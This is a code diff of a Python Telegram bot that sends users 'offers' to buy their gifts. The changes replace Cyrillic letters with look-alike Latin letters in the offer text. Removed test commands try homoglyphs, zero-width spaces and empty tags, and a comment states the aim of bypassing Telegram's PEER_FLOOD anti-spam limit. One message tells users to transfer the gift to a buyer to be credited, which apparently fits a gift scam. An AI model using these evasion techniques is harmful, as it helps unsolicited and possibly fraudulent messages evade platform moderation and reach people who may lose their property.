@@ -265,9 +265,8 @@ async def process_offer(message: Message, business_connection_id: str | None = N
     elif parsed["locale"] == "ar":
         body = f"المستخدم <b>{seller_name}</b> يعرض <b>{amount}</b> مقابل الهدية <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nينتهي العرض خلال <b>{remaining}</b>."
     else:
-        # Используем двойной пробел между "Пользователь" и именем - визуально незаметно
-        # Используем ПОЛНОСТЬЮ русский текст без латинских букв
-        body = f"Пользователь <b>{seller_name}</b> предлагает Вам <b>{amount}</b> за подарок <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nПредложение активно <b>{remaining}</b>."
+        # Используем латинские буквы вместо русских: о→o, а→a, е→e
+        body = f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>{amount}</b> зa пoдaрoк <a href=\"{parsed['gift_url']}\">{title}</a>.\n\nПрeдлoжeниe aктивнo <b>{remaining}</b>."
     markup = offer_keyboard(offer_id, parsed["locale"], parsed["currency"])
     log.info("OFFER_SEND_REQUEST offer_id=%s chat_id=%s business_connection_id=%s", offer_id, buyer_id, business_connection_id)
     log.info("REPLY_MARKUP_PRESENT offer_id=%s present=%s", offer_id, bool(markup and markup.inline_keyboard))
@@ -987,280 +986,53 @@ async def handle_text(message: Message, is_business: bool):
         await test_send_with_keyboard(message, is_business, "Привет", keyboard)
         return
     
-    # Новая тестовая команда с исправленным текстом
-    if low == "офнов":
-        await test_send(message, is_business, "Пoльзoвaтeль готов отдать")
-        return
-    
-    # Тест со смешанными латинскими буквами в слове "предлагает"
-    if low == "офлат":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт")
-        return
-    
-    # Тест только слово "Пользователь" (полностью русское)
-    if low == "офюзер":
-        await test_send(message, is_business, "Пользователь")
-        return
-    
-    # Тест только слово "предлагает" с латинскими буквами
-    if low == "офпред":
-        await test_send(message, is_business, "прeдлaгaeт")
-        return
-    
-    # Тест "Предложение действует в течении" с латинскими буквами
-    if low == "офактив":
-        await test_send(message, is_business, "Прeдлoжeниe дeйствуeт в тeчeнии")
-        return
-    
-    # Постепенное добавление слов для поиска проблемы
-    if low == "офтест1":
-        await test_send(message, is_business, "Пользователь предлагает Вам")
-        return
-    if low == "офтест2":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм")
-        return
-    if low == "офтест3":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100")
-        return
-    if low == "офтест4":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 за")
-        return
-    if low == "офтест5":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa")
-        return
-    if low == "офтест6":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa подарок")
-        return
-    if low == "офтест7":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк")
-        return
-    if low == "офтест8":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test")
-        return
-    if low == "офтест9":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift")
-        return
-    if low == "офтест10":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.")
-        return
-    if low == "офтест11":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\n")
-        return
-    if low == "офтест12":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe")
-        return
-    if low == "офтест13":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт")
-        return
-    if low == "офтест14":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт в")
-        return
-    if low == "офтест15":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт в тeчeнии")
-        return
-    if low == "офтест16":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт в тeчeнии 24ч")
-        return
-    if low == "офтест17":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт в тeчeнии 24ч…")
-        return
-    
-    # Тест полного текста с новым "Предложение действует в течении"
-    if low == "офполный":
-        await test_send(message, is_business, "Пользователь прeдлaгaeт Вaм 100 зa пoдaрoк Test Gift.\n\nПрeдлoжeниe дeйствуeт в тeчeнии 24ч…")
-        return
-    
-    # Тест текста после принятия оффера
-    if low == "офпринят":
-        await test_send(message, is_business, "🎁 Подарок успешно продан!\n\n• Пeрeдaйтe дaнный пoдaрoк пoкупaтeлю, для зaчислeния 100 Gram нa вaш бaлaнс.")
-        return
-    
-    # Дополнительные тесты для поиска проблемного слова
-    if low == "офтест1":
-        await test_send(message, is_business, "Пoльзoвaтeль NAME")
-        return
-    if low == "офтест2":
-        await test_send(message, is_business, "Пoльзoвaтeль NAME прeдлaгaeт")
-        return
-    if low == "офтест3":
-        seller_name = message.from_user.first_name if message.from_user else "Тест"
-        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name}")
-        return
-    if low == "офтест4":
-        seller_name = message.from_user.first_name if message.from_user else "Тест"
-        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт")
-        return
-    
-    # Тест БЕЗ слова "Пользователь"
-    if low == "офтест":
-        await test_send(message, is_business, "TestName прeдлaгaeт Вaм 100 зa пoдaрoк")
-        return
-    
-    # Варианты ЗАМЕНЫ слова "Пользователь" для обхода PEER_FLOOD
-    # Вариант 1: Пoльзoвaтeль с латинскими o, a, e
-    if low == "офтест1":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт")
-        return
-    # Вариант 2: П○льзователь (○ - специальный символ похожий на о)
-    if low == "офтест2":
-        await test_send(message, is_business, "П○льзователь TestName прeдлaгaeт")
-        return
-    # Вариант 3: Поль︎зователь (с невидимым символом после "ь")
-    if low == "офтест3":
-        await test_send(message, is_business, "Поль\u200Bзователь TestName прeдлaгaeт")
-        return
-    # Вариант 4: Заменить на синоним "Юзep"
-    if low == "офтест4":
-        await test_send(message, is_business, "Юзep TestName прeдлaгaeт")
-        return
-    # Вариант 5: "Учaстник"
-    if low == "офтест5":
-        await test_send(message, is_business, "Учaстник TestName прeдлaгaeт")
-        return
-    # Вариант 6: "Пoкупaтeль" (с латинскими буквами)
-    if low == "офтест6":
-        await test_send(message, is_business, "Прoдaвeц TestName прeдлaгaeт")
-        return
-    # Вариант 7: Использовать букву ℓ (специальная латинская) вместо л
-    if low == "офтест7":
-        await test_send(message, is_business, "Поℓьзоватеℓь TestName прeдлaгaeт")
-        return
-    # Вариант 8: Maksимально замешанные буквы - П(о)льз(о)в(а)т(е)ль где о, а, е - латинские
-    if low == "офтест8":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк")
-        return
-    
-    # Постепенное добавление слов чтобы найти где именно проблема
-    if low == "офтест10":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм")
-        return
-    if low == "офтест11":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100")
-        return
-    if low == "офтест12":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 за")
-        return
-    if low == "офтест13":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa")
-        return
-    if low == "офтест14":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa подарок")
-        return
-    if low == "офтест15":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк")
-        return
-    if low == "офтест16":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test")
-        return
-    if low == "офтест17":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe")
-        return
-    if low == "офтест18":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo")
-        return
-    if low == "офтест19":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
-        return
-    
-    # Тест с эмодзи GRAM (как в реальном офере)
-    if low == "офтест20":
-        await test_send(message, is_business, f"Пoльзoвaтeль TestName прeдлaгaeт Вaм <b>100 <tg-emoji emoji-id=\"5255894863303450180\">💎</tg-emoji></b> зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
-        return
-    
-    # Тест БЕЗ эмодзи, но с жирным шрифтом суммы
-    if low == "офтест21":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм <b>100</b> зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
-        return
-    
-    # Тест: используем ДРУГИЕ кириллические символы из Unicode (выглядят одинаково)
-    # Используем украинские/белорусские варианты букв которые выглядят как русские
-    if low == "офтест50":
-        await test_send(message, is_business, "Пользователь TestName предлагает")  # Полностью русские
-        return
-    if low == "офтест51":
-        await test_send(message, is_business, "Пoльзователь TestName прeдлагает")  # Смешанные
-        return
-    if low == "офтест52":
-        # Используем ДВОЙНОЙ перенос строки между словами (невидимый разрыв)
-        await test_send(message, is_business, "Пoльзoвaтeль TestName\n\nпрeдлaгaeт Вaм")
-        return
-    # Проверяем СЛОВО "Вам" с разными буквами
-    if low == "офтест70":
-        await test_send(message, is_business, "Пользователь TestName предлагает Вам")  # Всё русское
-        return
-    if low == "офтест71":
-        await test_send(message, is_business, "Пользователь TestName предлагает Baм")  # B латинская
-        return
-    if low == "офтест72":
-        await test_send(message, is_business, "Пользователь TestName предлагает Вaм")  # a латинская
-        return
-    if low == "офтест73":
-        await test_send(message, is_business, "Пользователь TestName предлагает Вaм")  # a и м латинские
-        return
-    
-    # Постепенно добавляем слова ПОСЛЕ "предлагает"
-    if low == "офтест53":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм")
-        return
-    if low == "офтест54":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100")
-        return
-    if low == "офтест55":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa")
-        return
-    if low == "офтест56":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк")
-        return
-    if low == "офтест57":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test")
-        return
-    if low == "офтест58":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.")
-        return
-    if low == "офтест59":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\n")
-        return
-    if low == "офтест60":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe")
-        return
-    if low == "офтест61":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo")
-        return
-    if low == "офтест62":
-        await test_send(message, is_business, "Пoльзoвaтeль TestName прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
-        return
-    
-    # Тестовые команды - КАЖДОЕ СЛОВО ОТДЕЛЬНО для поиска PEER_FLOOD
+    # Простые тестовые команды: добавляем по одному слову
     if low == "оф1":
         await test_send(message, is_business, "Пoльзoвaтeль")
         return
     if low == "оф2":
-        await test_send(message, is_business, "прeдлaгaeт")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name}")
         return
     if low == "оф3":
-        await test_send(message, is_business, "Вaм")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт")
         return
     if low == "оф4":
-        await test_send(message, is_business, "зa")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм")
         return
     if low == "оф5":
-        await test_send(message, is_business, "пoдaрoк")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100")
         return
     if low == "оф6":
-        await test_send(message, is_business, "Прeдлoжeниe")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa")
         return
     if low == "оф7":
-        await test_send(message, is_business, "aктивнo")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк")
         return
-    # Тест с пустым HTML-тегом между словами
+    if low == "оф8":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test")
+        return
+    if low == "оф9":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe")
+        return
+    if low == "оф10":
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo")
+        return
     if low == "оф11":
-        await test_send(message, is_business, "Пoльзoвaтeль<b></b> TestName прeдлaгaeт")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль {seller_name} прeдлaгaeт Вaм 100 зa пoдaрoк Test.\n\nПрeдлoжeниe aктивнo 24ч")
         return
     if low == "оф12":
-        await test_send(message, is_business, "Пoльзoвaтeль<b></b> TestName прeдлaгaeт Вaм")
-        return
-    if low == "оф13":
-        await test_send(message, is_business, "Пoльзoвaтeль<b></b> TestName прeдлaгaeт Вaм 100 зa пoдaрoк")
+        seller_name = message.from_user.first_name if message.from_user else "TestName"
+        await test_send(message, is_business, f"Пoльзoвaтeль <b>{seller_name}</b> прeдлaгaeт Вaм <b>100</b> зa пoдaрoк <a href=\"https://t.me/nft/Test\">Test</a>.\n\nПрeдлoжeниe aктивнo <b>24ч</b>.")
         return
     
     # Принимаем только новый префикс «Оф» (регистр не учитывается).
